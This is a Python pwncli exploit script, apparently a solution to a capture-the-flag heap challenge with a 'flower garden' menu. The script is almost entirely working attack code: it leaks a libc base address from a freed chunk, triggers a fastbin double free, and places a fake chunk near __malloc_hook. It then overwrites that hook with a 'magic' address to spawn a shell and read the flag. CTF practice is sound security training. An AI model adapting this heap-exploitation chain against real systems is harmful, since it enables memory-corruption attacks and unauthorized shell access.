#!/usr/bin/python3
from pwncli import *

cli_script()

p:tube = gift['io']
elf:ELF = gift['elf']
libc: ELF = gift['libc']

def raise_flower(size, data="a\n", color="deadbeef"):
    p.sendlineafter("Your choice : ", "1")
    p.sendlineafter("Length of the name :", str(size))
    if size > 0:
        p.sendafter("The name of flower :", data)
    p.sendlineafter("The color of the flower :", color)

def visit(n=2):
    p.sendlineafter("Your choice : ", "2")
    m = p.recvlines(n)
    info(f"Get msg: {m}")
    return m

def remove_flower(idx):
    p.sendlineafter("Your choice : ", "3")
    p.sendlineafter("Which flower do you want to remove from the garden:", str(idx))

def clean():
    p.sendlineafter("Your choice : ", "4")

"""
1. leak addr use malloc 
2. attack malloc_hook to magic
"""

raise_flower(0x80)
raise_flower(0x60)

remove_flower(0)
clean()

raise_flower(0) # 0

m = visit(2)
libc_base_addr = u64_ex(m[0][-6:]) - 0x3c4bf8
log_libc_base_addr(libc_base_addr)
libc.address = libc_base_addr

raise_flower(0x60) # 2
remove_flower(1)
remove_flower(2)
remove_flower(1)

raise_flower(0x60, p64(libc.sym['__malloc_hook'] - 0x23))
raise_flower(0x60)
raise_flower(0x60)
raise_flower(0x60, b"a"*0x13+p64(0x400c5e))

p.sendlineafter("Your choice : ", "1")

get_flag_when_get_shell(p)

p.interactive()